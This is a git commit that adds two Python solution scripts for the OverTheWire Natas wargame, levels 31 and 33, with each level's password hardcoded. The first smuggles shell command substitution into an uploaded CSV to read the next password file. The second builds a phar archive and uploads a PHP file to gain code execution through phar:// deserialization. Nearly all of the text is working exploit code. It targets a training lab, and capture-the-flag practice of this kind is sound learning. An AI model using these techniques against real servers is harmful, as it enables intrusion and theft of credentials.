6b008971c85a1d0fc378f8576d0081906b8bcd75
mauzinho <mauzware@gmail.com>
2025-06-23 17:25:13 +0200

    Add files via upload

---
+++ Natas/natas31.py
@@ -0,0 +1,25 @@
+import requests
+import re
+
+url = "http://natas31.natas.labs.overthewire.org/index.pl?"
+auth = ("natas31", "m7bfjAHpJmSYgQWWeqRE2qVBuMiRNq0y")
+
+session = requests.Session()
+session.auth = auth
+
+# Payload: include command substitution in the CSV content
+payload = b"A,B\n1,2\n$(cat /etc/natas_webpass/natas32),2"
+
+files = [('file', ('evil.csv', payload))]
+
+r = session.post(url, files=files)
+
+# Print HTML to debug
+#print(r.text)
+
+# Look for a password pattern like: natas32:somepassword
+password_regex = re.compile(r'(natas32:[a-zA-Z0-9]+)')
+found = password_regex.findall(r.text)
+print(found)
+
+
---
+++ Natas/natas33-firmware.py
@@ -0,0 +1,29 @@
+import requests
+import json
+import hashlib
+import subprocess
+
+auth = ("natas33", "2v9nDlbSF7jvawaCncr5Z9kSzkmBeoCJ")
+url = "http://natas33.natas.labs.overthewire.org"
+
+
+content = b'<?php echo file_get_contents("/etc/natas_webpass/natas34"); ?>'
+content_hash = hashlib.md5(content).hexdigest()
+filename = 'shell.php'
+
+
+# Nothing does object injection in PHP better than PHP.
+# The templating is to avoid fiddling with the private attributes.
+with open('natas33.php.template', 'r') as template:
+    with open('natas33.php', 'w') as o:
+        o.write(template.read().format(filename, content_hash))
+
+# phar.readonly attribute is usually activated, to avoid exactly what we are trying to do ;)
+output = subprocess.check_output(['php', '-d', 'phar.readonly=false', 'natas33.php'])
+
+# Upload your rce script and overwrite the filename field to have the file accesible for the next step.
+requests.post(url + '/index.php', auth=auth, data={'filename': filename, 'submit': 'Upload File'}, files={'uploadedfile': content})
+
+# Now the tricky part: upload the generated phar file but instead of giving a file name, use the protocol handler.
+r = requests.post(url + '/index.php', auth=auth, data={'filename': 'phar://test.phar/test.txt', 'submit': 'Upload File'}, files={'uploadedfile': open('test.phar', 'rb')})
+print(r.text)
